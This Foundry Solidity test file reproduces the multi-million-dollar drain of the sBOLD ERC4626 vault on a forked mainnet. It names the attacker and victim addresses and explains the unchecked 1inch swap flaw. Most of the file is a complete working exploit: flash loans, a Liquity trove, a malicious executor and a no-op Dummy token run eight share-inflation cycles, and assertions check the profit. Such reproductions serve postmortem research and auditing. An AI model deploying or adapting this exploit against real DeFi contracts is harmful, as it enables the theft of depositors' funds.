// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.24;

import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/console.sol";

// @KeyInfo - Total Lost : ~3.43M USD (headline estimate across ~34 txs; a single representative
//                         tx is reconstructed and asserted below)
// Attacker        : https://etherscan.io/address/0x23245F620d1e910ad76e6B6De4f8284A53C9Ad2d
// Attack contract : https://etherscan.io/address/0x2e3A51a05D66eC581fB47187A1abc8E3B1e2cFb4
// Victim (sBOLD)  : https://etherscan.io/address/0x50Bd66D59911F5e086Ec87aE43C811e0D059DD11
// Example exploit tx :
//   https://etherscan.io/tx/0xaa3c7f00c5e449abb4d871b3fdad91e44d6a61c7d83c36eff23faf783d4e84cf
//
// @Summary
// K3 Capital's sBOLD is an ERC4626 vault over Liquity V2 BOLD stability pools. Its swap() is
// permissionless and routes collateral -> BOLD through a fixed 1inch v6 adapter using
// caller-supplied calldata. SwapLogic._execute only checks that the vault's BOLD balance rose by
// at least minOut; it never verifies the adapter actually consumed the collateral it approved.
// 1inch v6's generic swap(executor, desc, data) lets the caller pass an arbitrary executor, so the
// attacker points it at their own contract and "delivers" BOLD from their own stash while the
// collateral the vault approved is left untouched (swap1) or pulled straight back out (swap2).
//
// Per cycle: deposit 9M BOLD (mint cheap shares) -> pre-fund 4 WETH as bogus collateral that
// totalAssets then counts -> swap1 on the WETH pool injects BOLD via a dummy srcToken, lifting the
// share price -> redeem the shares at the inflated rate -> swap2 on the wstETH pool pulls the 4
// WETH back out through swap1's residual WETH approval. The vault's collateral is capped at 7,500
// BOLD, so the attacker keeps accounted collateral just under the cap by removing the WETH each
// cycle. Working capital is a 9.01M BOLD Liquity V2 trove opened against a 10k wstETH flash loan.
//
// After the eight cycles the attacker holds ~21,480 BOLD of skim. The final step redeems that BOLD
// through Liquity V2's CollateralRegistry, converting it into WETH + wstETH + rETH pulled from the
// lowest-rate troves across the three branches, so the realized profit is collateral and the BOLD
// position nets to zero, exactly as on-chain.
//
// Reconstruction is faithful (Morpho + Balancer flash loans, real Liquity V2 openTrove/closeTrove
// and redeemCollateral, 8 cycles of two swaps each through the real 1inch v6 router with a
// self-deployed executor, no mocked oracle/accounting, no vm.store, no vm.prank of a protocol
// identity, no opaque calldata replay, no deal() of borrowed capital). It reconciles to the
// on-chain tx to the wei: +4.219135 WETH, +5.768363 wstETH, +0.388633 rETH, 0 BOLD.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function transferFrom(address, address, uint256) external returns (bool);
}

interface IWETH is IERC20 { function deposit() external payable; }
interface IWstETH is IERC20 { function wrap(uint256) external returns (uint256); }
interface ILido { function submit(address) external payable returns (uint256); }

interface IMorpho { function flashLoan(address token, uint256 assets, bytes calldata data) external; }
interface IBalancer {
    function flashLoan(address recipient, address[] calldata tokens, uint256[] calldata amounts, bytes calldata userData) external;
}
interface IBorrowerOperations {
    function openTrove(address,uint256,uint256,uint256,uint256,uint256,uint256,uint256,address,address,address) external returns (uint256);
    function closeTrove(uint256) external;
}

struct SwapData { address sp; uint256 balance; bytes data; }
interface ISBoldVault {
    function deposit(uint256, address) external returns (uint256);
    function redeem(uint256, address, address) external returns (uint256);
    function swap(SwapData[] calldata, address) external;
    function getSBoldRate() external view returns (uint256);
    function totalAssets() external view returns (uint256);
}
interface ICollateralRegistry {
    // Liquity V2: burn BOLD, receive collateral pulled from the lowest-rate troves across branches.
    function redeemCollateral(uint256 boldAmount, uint256 maxIterations, uint256 maxFeePercentage) external;
}
interface IAggregationRouterV6 {
    struct SwapDescription {
        address srcToken; address dstToken; address payable srcReceiver; address payable dstReceiver;
        uint256 amount; uint256 minReturnAmount; uint256 flags;
    }
    function swap(address executor, SwapDescription calldata desc, bytes calldata data)
        external payable returns (uint256, uint256);
}

// Dummy "token" used as swap1 srcToken: 1inch calls transferFrom on it; it is a no-op that
// returns true, so no real collateral leaves sBOLD on swap1 (the WETH prefund stays and counts).
contract Dummy {
    function transferFrom(address, address, uint256) external pure returns (bool) { return true; }
    function approve(address, uint256) external pure returns (bool) { return true; }
    function balanceOf(address) external pure returns (uint256) { return type(uint256).max; }
}

contract sBOLD_exp is Test {
    address constant MORPHO = 0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb;
    IBalancer constant BALANCER = IBalancer(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    IWstETH constant WSTETH = IWstETH(0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0);
    ILido constant LIDO = ILido(0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84); // stETH
    IWETH constant WETH = IWETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IERC20 constant BOLD = IERC20(0x6440f144b7e50D6a8439336510312d2F54beB01D);
    IERC20 constant STETH = IERC20(0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84);
    IERC20 constant RETH = IERC20(0xae78736Cd615f374D3085123A210448E74Fc6393);
    ICollateralRegistry constant REGISTRY = ICollateralRegistry(0xf949982B91C8c61e952B3bA942cbbfaef5386684);
    IBorrowerOperations constant BO = IBorrowerOperations(0xa741A32f9dcFe6aDBa088fD0f97e90742d7d5DA3);
    ISBoldVault constant SBOLD = ISBoldVault(0x50Bd66D59911F5e086Ec87aE43C811e0D059DD11);
    address constant ONEINCH = 0x111111125421cA6dc452d289314280a0f8842A65;
    address constant SP_WETH = 0x5721cbbd64fc7Ae3Ef44A0A3F9a790A9264Cf9BF;
    address constant SP_WSTETH = 0x9502b7c397E9aa22FE9dB7EF7DAF21cD2AEBe56B;

    uint256 constant FORK_BLOCK = 26441928;
    uint256 constant SWAP1_DELIVER = 7159161560826656137246; // BOLD injected per cycle (trace minReturn)
    uint256 constant SWAP2_DELIVER = 3000;                   // wei BOLD (trace minReturn)

    Dummy dummy;
    uint256 troveId;
    uint256 pendingDeliver;

    function setUp() public {
        vm.createSelectFork("mainnet", FORK_BLOCK);
    }

    function testExploit() public {
        dummy = new Dummy();

        uint256 wethStart = WETH.balanceOf(address(this));
        uint256 wstStart = WSTETH.balanceOf(address(this));
        uint256 rethStart = RETH.balanceOf(address(this));
        uint256 rate0 = SBOLD.getSBoldRate();
        uint256 ta0 = SBOLD.totalAssets();

        // Outer flash loan: 10k wstETH (trove collateral) from Morpho. Inside, the 8-cycle drain
        // runs and both flash loans + the trove are settled, leaving the BOLD skim on this contract.
        IMorpho(MORPHO).flashLoan(address(WSTETH), 10_000 ether, "");

        // Final step, exactly as the on-chain tx: redeem the entire BOLD skim through Liquity V2's
        // CollateralRegistry, converting it into WETH + wstETH + rETH pulled from the lowest-rate
        // troves across all three branches. This is a permissionless core Liquity action.
        uint256 boldSkim = BOLD.balanceOf(address(this));
        BOLD.approve(address(REGISTRY), type(uint256).max);
        REGISTRY.redeemCollateral(boldSkim, 1000, 1e18);

        int256 wethNet = int256(WETH.balanceOf(address(this))) - int256(wethStart);
        int256 wstNet = int256(WSTETH.balanceOf(address(this))) - int256(wstStart);
        int256 rethNet = int256(RETH.balanceOf(address(this))) - int256(rethStart);
        uint256 boldLeft = BOLD.balanceOf(address(this));

        console.log("sBOLD rate  before:", rate0);
        console.log("sBOLD rate  after :", SBOLD.getSBoldRate());
        console.log("sBOLD totalAssets before:", ta0 / 1e18);
        console.log("sBOLD totalAssets after :", SBOLD.totalAssets() / 1e18);
        console.log("BOLD skim redeemed:", boldSkim / 1e18);
        emit log_named_decimal_int("attacker WETH net ", wethNet, 18);
        emit log_named_decimal_int("attacker wstETH net", wstNet, 18);
        emit log_named_decimal_int("attacker rETH net  ", rethNet, 18);
        console.log("BOLD left (~0):", boldLeft);

        // Reconciled to the on-chain tx: profit is collateral (WETH + wstETH + rETH), BOLD nets ~0.
        // On-chain: +4.219135 WETH, +5.768363 wstETH, +0.388633 rETH, redeemCollateral(21480.30 BOLD).
        assertApproxEqRel(uint256(wethNet), 4.219135 ether, 0.02e18, "WETH net off");
        assertApproxEqRel(uint256(wstNet), 5.768363 ether, 0.02e18, "wstETH net off");
        assertApproxEqRel(uint256(rethNet), 0.388633 ether, 0.02e18, "rETH net off");
        assertLt(boldLeft, 1 ether, "BOLD should net ~0");
        assertLt(SBOLD.totalAssets(), ta0, "vault not drained");
    }

    function onMorphoFlashLoan(uint256 assets, bytes calldata) external {
        require(msg.sender == MORPHO, "morpho");
        address[] memory tk = new address[](1);
        uint256[] memory am = new uint256[](1);
        tk[0] = address(WETH);
        am[0] = 40 ether; // WETH for gas comp + per-cycle swap pre-funding
        BALANCER.flashLoan(address(this), tk, am, abi.encode(assets));
        WSTETH.approve(MORPHO, assets); // repay Morpho
    }

    function receiveFlashLoan(address[] calldata, uint256[] calldata amounts, uint256[] calldata fees, bytes calldata data) external {
        require(msg.sender == address(BALANCER), "balancer");
        uint256 coll = abi.decode(data, (uint256));

        // Tiny wstETH dust for the SP_wstETH pre-fund (mirrors the real tx's Lido submit).
        vm.deal(address(this), 1e12);
        LIDO.submit{value: 1e12}(address(0));
        STETH.approve(address(WSTETH), type(uint256).max);
        WSTETH.wrap(1e11);

        // Open the Liquity V2 trove: 10k wstETH -> 9.01M BOLD working capital.
        WSTETH.approve(address(BO), type(uint256).max);
        WETH.approve(address(BO), type(uint256).max);
        troveId = BO.openTrove(address(this), 1, coll, 9_010_000 ether, 0, 0, 5e15, type(uint256).max, address(0), address(0), address(0));

        BOLD.approve(address(SBOLD), type(uint256).max);

        // One-time 1 wei wstETH into sBOLD so SP_wstETH swap2 fires every cycle.
        WSTETH.transfer(address(SBOLD), 1);

        for (uint256 i = 0; i < 8; i++) { _cycle(); }

        BOLD.approve(address(BO), type(uint256).max);
        BO.closeTrove(troveId);
        WETH.transfer(address(BALANCER), amounts[0] + fees[0]); // repay Balancer
    }

    function _cycle() internal {
        // 1. deposit 9M BOLD -> cheap shares
        uint256 shares = SBOLD.deposit(9_000_000 ether, address(this));

        // 2. pre-fund 4 WETH as bogus "collateral"
        WETH.transfer(address(SBOLD), 4 ether);

        // 3. swap1 on SP_WETH: inject BOLD via dummy srcToken, pump the rate
        pendingDeliver = SWAP1_DELIVER;
        _doSwap(SP_WETH, address(dummy), 1, SWAP1_DELIVER);

        // 4. redeem all shares at the inflated rate
        SBOLD.redeem(shares, address(this), address(this));

        // 5. swap2 on SP_wstETH: pull the 4 WETH back out via swap1's residual WETH approval
        pendingDeliver = SWAP2_DELIVER;
        _doSwap(SP_WSTETH, address(WETH), 4 ether, SWAP2_DELIVER);
    }

    function _doSwap(address sp, address srcToken, uint256 amount, uint256 minReturn) internal {
        IAggregationRouterV6.SwapDescription memory desc = IAggregationRouterV6.SwapDescription({
            srcToken: srcToken,
            dstToken: address(BOLD),
            srcReceiver: payable(address(this)),
            dstReceiver: payable(address(SBOLD)),
            amount: amount,
            minReturnAmount: minReturn,
            flags: 0
        });
        bytes memory inner = abi.encodeWithSelector(IAggregationRouterV6.swap.selector, address(this), desc, bytes(""));
        SwapData[] memory sd = new SwapData[](1);
        sd[0] = SwapData({sp: sp, balance: 4 ether, data: inner});
        SBOLD.swap(sd, address(this));
    }

    // Negative control: without the swap-verification abuse, a plain deposit then redeem of the
    // same capital returns no more than was put in (rounding makes it strictly less). This isolates
    // swap() as the drain vector. Control funding uses deal() since it only needs working
    // capital to deposit, not the flash-loan trove the real exploit path draws BOLD from.
    function testControl_DepositRedeemNoProfit() public {
        uint256 amount = 8_000_000 ether;
        deal(address(BOLD), address(this), amount); // control funding only; no swap-bug involved

        BOLD.approve(address(SBOLD), type(uint256).max);
        uint256 before = BOLD.balanceOf(address(this));
        uint256 shares = SBOLD.deposit(amount, address(this));
        uint256 got = SBOLD.redeem(shares, address(this), address(this));
        uint256 ending = BOLD.balanceOf(address(this));

        console.log("control deposited:", amount / 1e18);
        console.log("control redeemed :", got / 1e18);
        assertLe(ending, before, "control must not profit without the swap bug");
    }

    // 1inch v6 executor callback: put `pendingDeliver` BOLD on the router, return it.
    function execute(address) external payable returns (uint256) {
        require(msg.sender == ONEINCH, "exec");
        BOLD.transfer(ONEINCH, pendingDeliver);
        return pendingDeliver;
    }

    receive() external payable {}
}
